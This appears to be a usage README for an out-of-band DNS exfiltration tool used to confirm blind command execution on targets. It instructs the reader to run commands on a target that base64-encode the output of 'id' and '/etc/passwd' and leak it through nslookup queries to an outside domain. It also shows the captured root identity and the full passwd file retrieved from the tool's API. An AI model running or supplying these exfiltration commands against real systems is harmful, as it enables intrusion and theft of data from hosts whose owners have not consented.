#Usage

###start###
nohup python checkvul.py 2>&1 &

###query###

Execute The Following Command On Your Target:

id |base64 -w60|cat -n|awk '{print $2"."$1".xdebug.info"};'|xargs -n 1 nslookup

##############################################################################################
root@vultr:~# id |base64 -w60|cat -n|awk '{print $2"."$1".xdebug.info"};'|xargs -n 1 nslookup
Server:		108.61.10.10
Address:	108.61.10.10#53

Non-authoritative answer:
Name:	dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK.1.xdebug.info
Address: 127.0.0.1
##############################################################################################

Access following API:
http://127.0.0.1/_query

Response:

"""
ECHO

uid=0(root) gid=0(root) groups=0(root)

****************************************************************************************************
DNS
dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK.1.xdebug.info. 45.32.103.184 2018-11-19 16:36:28
1.xdebug.info. 45.32.103.184 2018-11-19 16:36:28
xdebug.info. 45.32.103.184 2018-11-19 16:36:28
****************************************************************************************************

""""

###check###

nslookup check.7b0f687d4d6d.xdebug.info

######################################################
root@vultr:~# nslookup check.7b0f687d4d6d.xdebug.info
Server:		108.61.10.10
Address:	108.61.10.10#53

Non-authoritative answer:
Name:	check.7b0f687d4d6d.xdebug.info
######################################################

Request API:
http://localhost/_check?type=dns&uuid=7b0f687d4d6d

Response JSON:
{"result": 1, "uuid": "7b0f687d4d6d", "log": "check.7b0f687d4d6d.xdebug.info.\t45.32.103.184\t2018-11-19 16:22:41"}

###echo###

cat /etc/passwd |base64 -w60|cat -n|awk '{print $2"."$1".8b0f687d4d6d.xdebug.info"};'|xargs -n 1 nslookup

####################################################################################################
root@vultr:~# cat /etc/passwd |base64 -w60|cat -n|awk '{print $2"."$1".8b0f687d4d6d.xdebug.info"};'|xargs -n 1 nslookup
Server:		108.61.10.10
Address:	108.61.10.10#53

Non-authoritative answer:
Name:	cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6.1.8b0f687d4d6d.xdebug.info
Address: 127.0.0.1

Server:		108.61.10.10
Address:	108.61.10.10#53

Non-authoritative answer:
Name:	ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6.2.8b0f687d4d6d.xdebug.info
Address: 127.0.0.1

Server:		108.61.10.10
Address:	108.61.10.10#53
...
...
####################################################################################################

Request API:
http://localhost/_echo?type=dns&uuid=8b0f687d4d6d

Response JSON:
{"result": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\nsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\nsystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\nsystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\nsyslog:x:104:108::/home/syslog:/bin/false\n_apt:x:105:65534::/nonexistent:/bin/false\nlxd:x:106:65534::/var/lib/lxd/:/bin/false\nmessagebus:x:107:111::/var/run/dbus:/bin/false\nuuidd:x:108:112::/run/uuidd:/bin/false\ndnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false\nsshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin\nntp:x:111:115::/home/ntp:/bin/false\nrdnssd:x:112:65534::/var/run/rdnssd:/bin/false\nredis:x:113:116::/var/lib/redis:/bin/false\nmysql:x:114:117:MySQL Server,,,:/nonexistent:/bin/false\n", "uuid": "8b0f687d4d6d", "log": "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6.1.8b0f687d4d6d.xdebug.info.\t45.32.103.184\t2018-11-19 16:27:31"}
